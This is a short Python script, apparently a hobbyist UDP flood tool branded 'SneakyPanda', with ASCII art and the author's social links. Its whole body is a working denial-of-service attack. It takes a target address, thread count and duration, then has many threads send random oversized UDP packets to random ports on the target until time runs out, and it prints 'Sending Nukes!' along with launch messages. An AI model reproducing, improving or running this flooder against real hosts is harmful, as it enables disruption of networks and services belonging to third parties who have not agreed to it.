import socket
import threading
import sys
import random
import time
import os
import requests


print(r"""
                                                        ,-.
                                   ___,---.__          /'|`\          __,---,___
                                ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
                              ,'        |           ~'\     /`~           |        `.
                             /      ___//              `. ,'          ,  , \___      \
                            |    ,-'   `-.__   _         |        ,    __,-'   `-.    |
                            |   /          /\_  `   .    |    ,      _/\          \   |
                            \  |           \ \`-.___ \   |   / ___,-'/ /           |  /
                             \  \           | `._   `\\  |  //'   _,' |           /  /
                              `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
                                 ``       /     \    ,='/ \`=.    /     \       ''
                                         |__   /|\_,--.,-.--,--._/|\   __|
                                         /  `./  \\`\ |  |  | /,//' \,'  \
                                        /   /     ||--+--|--+-/-|     \   \
                                       |   |     /'\_\_\ | /_/_/`\     |   |
                                        \   \__, \_     `~'     _/ .__/   /
                                        `-._,-'   `-._______,-'   `-._,-'
""")

try: 
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
    
except IndexError:
    print('\n[-] Command usage: ' + sys.argv[0] + '<target> <threads> <time> !')
    sys.exit()

timeout = time.time() + 1 * timer
    
def attack():
    try:
        bytes = random._urandom(2048)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15),(target, dport))
        return
        sys.exit()
    except:
        pass

    clear = lambda: os.system('cls')
    clear()

print('                       -------------------------------------------------')    
print('                       | SneakyPanda\'s socials                          |')
print('                       | Discord: SneakyPanda#7981                      |')
print('                       | Github: SneakyPanda998                         |')
print('                       | Instagram: Coming soon!                        |')
print('                       | Current Project: https://discord.gg/VQsrvPSvEd |')
print('                       |-------------------------------------------------')

print('                                   [+] Sending Nukes!')
for x in range(0, threads):
    threading.Thread(target=attack).start()

for x in range(0, threads):
    threading.Thread(target=attack).start()

print('                     root@Panda$: Attack launched with: ', threads, 'Threads')
print('                     root@Panda$: Attack is running for: ', timer, 'Seconds')
print('                     root@Panda$: Target IP: ', target)
print('                     root@Panda$: Succesfully attack!')
